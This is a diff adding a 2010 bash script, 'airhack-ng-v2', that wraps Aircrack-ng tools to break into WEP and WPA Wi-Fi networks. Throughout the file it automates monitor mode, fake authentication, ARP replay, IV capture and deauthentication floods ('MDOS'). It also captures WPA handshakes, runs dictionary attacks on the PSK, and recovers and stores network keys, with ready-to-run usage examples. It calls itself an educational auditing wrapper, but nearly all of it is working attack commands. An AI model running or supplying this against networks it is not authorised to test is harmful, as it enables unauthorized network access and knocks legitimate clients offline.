@@ -1,0 +1,346 @@
+#!/bin/bash
+# project started by Bitwise Operator on: 3.17.2010
+# Major Realease Date: 	v2.0 Released April 14 2010
+# This program is intented for educational purposes only 
+# as a 'wrapper' for WEP/WPA security auditing with the Aircrack-ng Toolsuite.
+# tested under kubuntu 9.10, with an b43 (Broadcom 4312) driver and working fine..
+## Params ##
+ARGS=("$@") 			## put all params into array
+SCRIPT_NAME='airhack-ng-v2' 
+SCRIPT_VERSION='v2.0'   
+SCRIPT_COPYRIGHT='No Copyright 2009, Bitwise Operator. Published under the Free Public License.'
+AIRHACK_NG_DIR=~/'airhack-ng/'
+CNT=0				
+CURR_STRNG=			
+SCAN_NETWORKD=0
+COMMND1=0
+CAPTURE_IVS=0
+COMMND3=0
+KONSOLE=
+KONSOLE_CMD="konsole --hold --new-tab -e "
+KONSOLE_ENABLE=0
+SETTINGS=("")
+SAVE_SETTINGS=0
+GET_SETTINGS=0
+SHOWDATA=0
+ENABLE_MONITOR=0
+DISABLE_MONITOR=0
+MONITOR=0
+ERROR_CHOICE=0
+GET_OWN_MAC=$(ifconfig wlp2s0 | grep HWaddr | sed -e 's/^.*addr\ //' | cut -c 1-17 | tr \- \:)
+GET_MON_CNT=$(airmon-ng | grep mon | wc -l)
+GET_KEY=0
+KEY=""
+SAVE_FILE=""
+DICTIONARY=""
+DICTIONARY_ATTACK=0
+MDOS_ATTACK=0
+WPA_HANDSHAKE=0
+## Functions ##
+  function save_settings(){
+	if [ "${SAVE_SETTINGS}" = "1" ]; then 
+	  echo -e  ADAPTER=${ADAPTER}       		>  ${AIRHACK_NG_DIR}"${ESSID}".net 
+	  echo -e  CHANNEL=${CHANNEL}       		>> ${AIRHACK_NG_DIR}"${ESSID}".net
+	  echo -e  BSSID=${BSSID}           		>> ${AIRHACK_NG_DIR}"${ESSID}".net
+	  echo -e  OWN_MAC=${OWN_MAC}       		>> ${AIRHACK_NG_DIR}"${ESSID}".net
+	  echo -e  CLIENT_MAC=${CLIENT_MAC} 		>> ${AIRHACK_NG_DIR}"${ESSID}".net
+	  echo -e "> saved data to ${ESSID}.net <"
+	fi
+}
+  function get_params(){			## parse params
+      if [ "${ARGS}" != "" ]; then
+      for i in ${ARGS[@]}; do
+	CURR_STRNG="${ARGS[$CNT]}"
+		case "${CURR_STRNG}" in 
+		 -h			) usage ;; 
+		 --help			) usage ;; 
+		 -a			) ADAPTER=${ARGS[$((CNT+1))]} 		;; 
+		 -e			) ESSID="${ARGS[$((CNT+1))]}"		;;
+		 -c			) CHANNEL=${ARGS[$((CNT+1))]}		;;
+		 -b			) BSSID=${ARGS[$((CNT+1))]} 		;;
+		 -m			) OWN_MAC=${ARGS[$((CNT+1))]} 		;; 
+		 -s			) CLIENT_MAC=${ARGS[$((CNT+1))]} 	;;
+		 -k			) KONSOLE_ENABLE=1 && KONSOLE=${KONSOLE_CMD} ;; 
+		 -1			) COMMND1=1 				;;
+		 -2			) CAPTURE_IVS=1 				;;
+		 -3			) COMMND3=1 				;;
+		 -4 			) DICTIONARY_ATTACK=1			;;
+		 -5 			) WPA_HANDSHAKE=1 			;;
+		 -6 			) MDOS_ATTACK=1 			;;
+		 -i			) if [ "${ESSID}" = "" ]; then ERROR_CHOICE=1 ; report_error ; else  if [ ! -f ${AIRHACK_NG_DIR}"${ESSID}.net" ]; then ERROR_CHOICE=3 ; report_error ; else GET_SETTINGS=1 ; fi; fi ;; 
+		 -g			) OWN_MAC=${GET_OWN_MAC}			;;
+		 -l			) for file in ${AIRHACK_NG_DIR}*.net ; do echo -e "\n"${file}"\n" | sed -e 's/\!/\\\!/' ; cat  "$file" | sed -e 's/\!/\\\\\\\!/' ;done ;;
+		 --scan 		) SCAN=1 				;; 
+		 --get_key 		) GET_KEY=1 				;; 
+		 --save 		) SAVE_SETTINGS=1  			;; 
+		 -em			) ENABLE_MONITOR=1 			;;
+		 -dm			) DISABLE_MONITOR=1 			;;
+		 --enable_monitor	) ENABLE_MONITOR=1 			;;
+		 --disable_monitor	) DISABLE_MONITOR=1 			;;
+		 --dict			) DICTIONARY=${ARGS[$((CNT+1))]}	;;
+		 --show			) SHOWDATA=1				;;
+		 *			) ;;
+		esac
+	CNT=$((CNT+1))
+      done
+      else 
+	ERROR_CHOICE=4
+	report_error
+      fi
+	CNT=0 
+}
+  function get_settings_from_file(){
+	if [ "${GET_SETTINGS}" = "1" ]; then
+	  FILENAME=${AIRHACK_NG_DIR}${ESSID}.net
+	  echo "$FILENAME"
+	  if [ -f "${FILENAME}" ]; then
+	  SETTINGS=$(echo -e $(for LINE in $(cat "${FILENAME}"); do echo -e "$LINE" | sed "s/^ *//;s/ *$//;s/ \{1,\}/_/g" | sed -e 's/\=/ /' ; done ) )
+	  set -- $SETTINGS
+	  CNT=0
+	  for CURR_STRNG in ${SETTINGS}; do 
+	    if [ "$CURR_STRNG" !=  "" ]; then
+		case "$CURR_STRNG" in
+			ADAPTER		)  if [ "${2}" != "${ADAPTER}" ] & [ "${ADAPTER}" = "" ]; then ADAPTER=${2} ; else ADAPTER="${ADAPTER}" ; fi ;;
+			CHANNEL		)  if [ "${4}" != "${CHANNEL}" ] & [ "${CHANNEL}" = "" ]; then CHANNEL=${4}; else CHANNEL="${CHANNEL}"; fi ;;
+			BSSID		)  if [ "${6}" != "$BSSID" ] & [ "${BSSID}" = "" ]; then BSSID=${6}; else BSSID="${BSSID}"; fi ;;
+			OWN_MAC		)  if [ "${8}" != "${OWN_MAC}" ] & [ "${OWN_MAC}" = "" ]; then OWN_MAC=${8}; else OWN_MAC="${OWN_MAC}"; fi ;;
+			CLIENT_MAC 	)  if [ "${10}" != "$CLIENT_MAC" ] & [ "${CLIENT_MAC}" = "" ]; then CLIENT_MAC=${10}; else CLIENT_MAC="${CLIENT_MAC}"; fi ;;
+			KEY	 	)  KEY=`echo -en "${12} ${13} ${14} ${15} ${16} ${17} ${18} ${19} ${20} ${21} ${22} ${23} ${24}) ${25} ${26} ${27} ${28}"` ;;
+			 *		) ;;
+	        esac
+	    fi 
+	  CNT=$((CNT+1))
+	  done
+   	  echo "> loaded data from ${ESSID}.net <"
+	  else
+	   if [ "$ERROR_CHOICE" != "0" ]; then ERROR_CHOICE=4 ; report_error ; fi
+	  fi
+	fi
+	CNT=0	
+}
+  function usage(){				## print usage info
+	echo -e "\033[34;40m${SCRIPT_NAME} ${SCRIPT_VERSION} ${SCRIPT_COPYRIGHT}"
+	echo -e "\033[37;0mUsage : ${SCRIPT_NAME}  {[params] [value]} .."
+	echo -e 					" \t\t -a {value}\t\t\t\t\t# Wifi ADAPTER #";
+	echo -e 					" \t\t -e {value}\t\t\t\t\t# ESSID #"
+	echo -e						" \t\t -b {value}\t\t\t\t\t# BSSID MAC#"
+	echo -e 					" \t\t -c {value}\t\t\t\t\t# CHANNEL #"
+	echo -e 					" \t\t -s {value}\t\t\t\t\t# CLIENT MAC #"
+	echo -e 					" \t\t -m {value}\t\t\t\t\t# OWN MAC #"
+	echo -e 					" \t\t -g \t\t\t\t\t\t# Get OWN MAC from ADAPTER (don't use -m here ) #"
+	echo -e						" \t\t --scan \t\t\t\t\t# Check what AP's are Online befor capture #"
+	echo -e						" \t\t -em or --enable_monitor\t\t\t# enable MONITOR mode on given Wifi ADAPTER #"
+	echo -e						" \t\t -dm or --disable_monitor\t\t\t# disable MONITOR mode #"
+	echo -e 					" \t\t -1 \t\t\t\t\t\t# Fake Authentication #"
+	echo -e 					" \t\t -2 \t\t\t\t\t\t# Capture IV's to file #"
+	echo -e 					" \t\t -3 \t\t\t\t\t\t# Arp replay to Increase traffic for capture #"
+	echo -e						" \t\t -4 \t\t\t\t\t\t# Dictionary attack (PSK) #" 					
+	echo -e						" \t\t -5 \t\t\t\t\t\t# WPA Handshake Capture #" 					
+	echo -e						" \t\t -6 \t\t\t\t\t\t# MDOS Attack #" 					
+	echo -e						" \t\t -k \t\t\t\t\t\t# Open every command in new Konsole tab #"
+	echo -e						" \t\t --save \t\t\t\t\t# save settings to file named <ESSID>.net," 
+	echo -e 					" \t\t\t\t\t\t\t\t\t so settings for each ESSID can be saved #"
+	echo -e						" \t\t -i \t\t\t\t\t\t# import settings from previous save #"
+	echo -e						" \t\t -l \t\t\t\t\t\t# list available settings files #"
+	echo -e						" \t\t --get_key \t\t\t\t\t# get key from captured file of given ESSID #"
+	echo -e 					" \t\t --dict \t\t\t\t\t# DICTIONARY filename #"
+	echo -e						" \t\t -h or --help\t\t\t\t\t# this helpscreen #"
+	echo -e 					" \n" 
+	echo -e						" \t\twep examples:"
+	echo -e						" \t\t# ( -e -b -a (-m or -g) -s -c attributes are mandatory before 1st save to do a complete attack.)"
+	echo -e						" \t\t ${SCRIPT_NAME} -e essid -a wlan0 -k -em -c 10 -g -b 11:11:11:11:11 -s 22:22:22:22:22:22  --save "
+	echo -e						" \t\t ${SCRIPT_NAME} --scan -a wlan0 \t\t\t\t\t# to look for encrypted Networks"
+	echo -e						" \t\t ${SCRIPT_NAME} -a wlan --enable-monitor \t\t\t# this should be executed first, but only once.."
+	echo -e						" \t\t ${SCRIPT_NAME} -e essid -i --enable-monitor \t\t\t# or this if you already saved data for essid"
+	echo -e						" \t\t ${SCRIPT_NAME} -e essid -i -c 3 -b 00:00:11:11:22:33 -1"
+	echo -e						" \t\t ${SCRIPT_NAME} -e essid -i -1\t\t\t\t\t# to start just the fake auth. attack"
+	echo -e						" \t\t ${SCRIPT_NAME} -e essid -i -s 11:22:33:44:55:66 -3 --save \t# to change data in config file"
+	echo -e						" \t\t ${SCRIPT_NAME} -e essid -i --show \t\t\t\t# to show config file from essid"
+	echo -e						" \t\t ${SCRIPT_NAME} -e essid -i -k -1 -2 -3 \t\t\t\t# to do a complete wep attack"
+	echo -e						" \t\t if more than 1 scan is used -k option is mandatory"
+	echo -e 					" \n"
+	echo -e 					" \t\twpa examples:"
+	echo -e						" \t\t# ( -e -b -a (-m or -g) -s -c attributes are mandatory before 1st save to do a complete attack.)"
+	echo -e						" \t\t ${SCRIPT_NAME} -e essid -a wlan0 -k -em -c 10 -g -b 11:11:11:11:11 -s 22:22:22:22:22:22  --save "
+	echo -e						" \t\t ${SCRIPT_NAME} -e essid -i -2 \t\t\t\t# to start capture #"
+	echo -e 					" \t\t ${SCRIPT_NAME} -e essid -i -5 \t\t\t\t# to deauthenticate client to capture wpa handshake #"
+	echo -e 					" \t\t or"
+	echo -e 					" \t\t ${SCRIPT_NAME} -e essid -i -6 \t\t\t\t# to do a MDOS attack #"
+	echo -e 					" \t\t# Now wait for 4 way handshake to be captured then abort the capture and continue with: #"
+	echo -e						" \t\t ${SCRIPT_NAME} -e essid -i -4 --dict <DICTIONARY_FILENAME>\t# to start dictionary attack #"
+	echo -e 					" "
+	exit 0
+}
+  function report_error(){			## print error info
+	if [ "${ERROR_CHOICE}" != "0" ]; then 
+	  case $ERROR_CHOICE in  
+	   1 		) echo -e "\n\tPlease supply ESSID:  ${SCRIPT_NAME} -e {ESSID} "${ARGS[@]}"\n" ;;
+	   2 		) echo -e "\n\tPlease supply Wifi Adapter:  ${SCRIPT_NAME} -a {ADAPTER} ${ARGS[@]}\n" ;;
+	   3 		) echo -e "\n\tFile Does NOT Exist, please save first or load existing ESSID filename\n" ;;
+	   4 		) echo -e "\n\t\t\t# No parameters supplied.. Please do!  # \n" ;;
+	   5 		) echo -e "\n\t\t\t# No Dictionary supplied.. Please do!  # \n" ;;
+	   *		) ;;
+	  esac
+	usage
+	exit 
+	fi 
+}
+  function deauth_attack(){  				## Deauth. Attack to get more IVS
+	if [ "${COMMND1}" = "1" ]; then
+	  if [ ${GET_MON_CNT} -gt 0 ]; then
+	    echo -e "\n1 : ${KONSOLE} aireplay-ng -1 10 -q 5 -e "$(echo -e ${ESSID} | sed 's!\([]\*\ \!\$\/&[]\)!\\\1!g')" -a ${BSSID} -h ${OWN_MAC} mon0\n"
+	    read -n 1 -p "deauthentication attack to get more ivs .. U Shure ?!
+	    Press [enter] to continue or [^C] to abort" 
+	    ${KONSOLE} aireplay-ng -1 10 -q 5 -e "$(echo -e ${ESSID} | sed 's!\([]\*\ \!\$\/&[]\)!\\\1!g')" -a ${BSSID} -h ${OWN_MAC} mon0 $( if [ "$MONITOR_ENABLE" = "1" ]; then echo '&' ; fi )
+	  else
+	    ENABLE_MONITOR=1
+	    enable_monitor
+	    GET_MON_CNT=1
+	    deauth_attack
+	  fi
+	 else
+	    if [ "$ERROR_CHOICE" != "0" ]; then ERROR_CHOICE=1 ; report_error ; fi
+	fi
+}
+  function capture_ivs(){				## Capture IVS to File Named <ESSID>.-01.ivs
+	if [ "${CAPTURE_IVS}" = "1" ]; then 
+	  echo -e "\n"2 : ${KONSOLE}airodump-ng --ivs -c "${CHANNEL}" --bssid "${BSSID}" -w $(${AIRHACK_NG_DIR})"${ESSID}" mon0 "\n"
+	  read -n 1 -p "Capture Data to File called ${ESSID}-01.ivs so you can use that later to get the key from ..
+	  Press [enter] to continue or [^C] to abort" 
+	  ${KONSOLE} airodump-ng --ivs -c "${CHANNEL}" --bssid "${BSSID}" -w ${AIRHACK_NG_DIR}"${ESSID}" mon0 $( if [ "$MONITOR_ENABLE" = "1" ]; then echo '&' ; fi ) 
+	fi
+}
+function arp_request(){				## Send ARP Packets To Increase Traffic on given BSSID
+	if [ "${COMMND3}" = "1" ]; then  
+          echo -e "\n3 : ${KONSOLE}aireplay-ng -3 -b ${BSSID} "${ESSID}" -h ${OWN_MAC} mon0\n"
+	  read -n 1 -p "Send ARP Packets to increase traffic .. 
+	  Press [enter] to continue or [^C] to abort"
+	  ${KONSOLE} aireplay-ng -3 -e ${ESSID} -b ${BSSID} -h ${OWN_MAC} mon0 $( if [ "$MONITOR_ENABLE" = "1" ]; then echo '&' ; fi ) 
+	fi
+}
+  function scan_networks(){
+	if [ "$SCAN" = "1" ] && [ "${ADAPTER}" = "" ] || [ "${ERROR_CHOICE}" != "0" ]; then ERROR_CHOICE=2 ; report_error ; else  
+	  if [ "$SCAN" = "1" ]; then 
+	  echo -e "\nscan : ${KONSOLE}airodump-ng ${ADAPTER}\n"
+	  read -n 1 -p "Opening airodump to search for suitable network.
+	  Press [enter] to continue or [^C] to abort" 
+	  ${KONSOLE} airodump-ng ${ADAPTER} $( if [ "$MONITOR_ENABLE" = "1" ]; then echo '&' else '' ; fi ) 
+	  fi
+	fi
+}
+  function enable_monitor(){
+	if [ "${ENABLE_MONITOR}" = "1" ] && [ "${ADAPTER}" = "" ] || [ "${ERROR_CHOICE}" != "0" ]; then ERROR_CHOICE=2 ; report_error ; else  
+	 if [ "${ENABLE_MONITOR}" = "1" ]; then 
+	  if [ ${GET_MON_CNT} -gt 0 ]; then
+	    echo -e "Monitor is already enabled.."
+	  else 
+	    echo -e "${KONSOLE}ifconfig ${ADAPTER} down \n ${KONSOLE}iwconfig ${ADAPTER} mode monitor \n ${KONSOLE}ifconfig ${ADAPTER} up \n ${KONSOLE}airmon-ng ${ADAPTER} ${CHANNEL}"
+	    read -n 1 -p "Enabeling Monitor Mode on Wifi Adapter ..
+	    Press [enter] to continue or [^C] to abort"
+		${KONSOLE} ifconfig ${ADAPTER} down 
+			   iwconfig ${ADAPTER} mode monitor  
+			   ifconfig ${ADAPTER} up  
+			   airmon-ng start ${ADAPTER} ${CHANNEL} &> /dev/null
+			   echo \> monitor started \<
+	  fi
+	 fi
+	fi
+}
+  function disable_monitor(){
+	if [ "${DISABLE_MONITOR}" = "1" ] && [ "${ADAPTER}" = "" ] || [ "${ERROR_CHOICE}" != "0" ]; then ERROR_CHOICE=2 ; report_error ; else  
+ 	 if [ "${DISABLE_MONITOR}" = "1" ]; then 
+	  if [ ${GET_MON_CNT} -gt 0 ]; then
+	    echo -e "${KONSOLE}ifconfig ${ADAPTER} down \n ${KONSOLE}iwconfig ${ADAPTER} mode managed \n ${KONSOLE}ifconfig ${ADAPTER} up\n"
+	    read -n 1 -p "Disabeling Monitor Mode on Wifi Adapter ..
+	    Press [enter] to continue or [^C] to abort"
+		${KONSOLE} airmon-ng stop mon$((($GET_MON_CNT-1))) &> /dev/null
+			   ifconfig ${ADAPTER} down 
+			   iwconfig ${ADAPTER} mode managed  
+			   ifconfig ${ADAPTER} up 
+			   echo \> monitor disabled \<
+	    else
+	    echo -e "Monitor is already disabled..."
+	  fi
+	 fi
+	fi
+}
+  function get_key(){
+	if [ "${GET_KEY}" = "1" ]; then 
+	  echo "> getting key from capturefile <"
+ 	      SAVE_FILE=${AIRHACK_NG_DIR}${ESSID}".net" 
+	      FILENAME=${ESSID}"-01.ivs"
+	      FULLNAME=${AIRHACK_NG_DIR}${FILENAME}
+	      ${KONSOLE} aircrack-ng -k 17 "${FULLNAME}" | grep FOUND |\
+		sed -e "s/^.*\[\ //" -e "s/\:/\ /g" -e "s/^[ \t]*//;s/[ \t]*$//" -e 's/\ \]//' -e "s/.*/\n\t--- KEY\=\"&\"/"
+	if [ "${SAVE_SETTINGS}" = "1" ]; then
+	   echo -en "\t\t${SAVE_FILE}\n\n"
+	      ${KONSOLE} aircrack-ng -k 17 "${FULLNAME}" | grep FOUND |\
+	      sed -e "s/^.*\[\ //" -e "s/\:/\ /g" -e "s/^[ \t]*//;s/[ \t]*$//" -e 's/\ \]//' -e "s/.*/KEY\=\"&\"/"\
+	      >> "${SAVE_FILE}"
+	   echo "> saved to file <"
+	  fi
+	fi
+}
+function dictionary_attack(){
+      if [ "$DICTIONARY_ATTACK" = "1" ]; then 
+	  if [ "${DICTIONARY}" != "" ]; then
+	      echo ${KONSOLE} aircrack-ng -w "${DICTIONARY}" -a 2 ${ESSID}"-01.ivs"
+	      ${KONSOLE} aircrack-ng -w "${DICTIONARY}" -a 2 ${ESSID}"-01.ivs"
+	  else 
+	      ERROR_CHOICE=5
+	      report_error
+	  fi
+      fi
+}
+function mdos_attack(){
+      if [ ${MDOS_ATTACK} = "1" ]; then
+	  echo -e "MDOS Attack"
+	  echo ${KONSOLE} aireplay-ng -0 0 -a ${BSSID} ${ADAPTER}
+	  ${KONSOLE} aireplay-ng -0 0 -a ${BSSID} ${ADAPTER}
+      fi
+}
+function wpa_handshake_capture(){
+      if [ "${WPA_HANDSHAKE}" = "1" ]; then
+	  echo -e "WPA Handshake Capture"
+	  echo aireplay-ng -0 5 -a ${BSSID} -h ${CLIENT_MAC} ${ADAPTER}
+	  aireplay-ng -0 5 -a ${BSSID} -h ${CLIENT_MAC} ${ADAPTER}
+      fi
+}
+  function show_data(){
+	if  [ "${SHOWDATA}" = "1" ] ; then
+	  echo -e  ------------------------------------------------
+	  echo -e "  a: Wifi Adapt.  	= "${ADAPTER}"             "
+	  echo -e "  c: Channel      	= "${CHANNEL}"		   "
+	  echo -e "  b: AP MAC addr  	= ${BSSID}           	   "
+	  echo -e "  m: Your Wifi MAC	= ${OWN_MAC}       	   "
+	  echo -e "  s: Client MAC   	= ${CLIENT_MAC} 	   "
+  	  echo -en "  k: konsole enabled    = ";if [ ${KONSOLE_ENABLE} = "0" ]; then echo "no" ; else echo "yes" ; fi    
+   	  echo -en "  monitor enabled	= ";if [ ${GET_MON_CNT} = "0" ]; then echo "no" ; else echo "yes" ; fi
+	  echo -e "  number of monitors	= ${GET_MON_CNT}   "
+	  echo -en "  settings filename     = ";if [ "${GET_SETTINGS}" = "1" ]; then echo "${ESSID}.net"; else echo -e ""; fi  
+	  echo -e "  g: get own mac	= ${GET_OWN_MAC}	   "
+	  echo -e "  saved key: KEY	= "${KEY}"	   "
+	  echo -e  ------------------------------------------------
+	fi
+}
+#### check if any params given ####
+if [ "${1}" = "" ] ; then
+  ERROR_CHOICE=4
+  report_error           
+  exit 0
+fi        
+## Main Program ##
+get_params
+get_settings_from_file
+save_settings
+show_data
+enable_monitor
+disable_monitor
+scan_networks
+deauth_attack
+capture_ivs
+arp_request
+get_key
+dictionary_attack
+mdos_attack
+wpa_handshake_capture
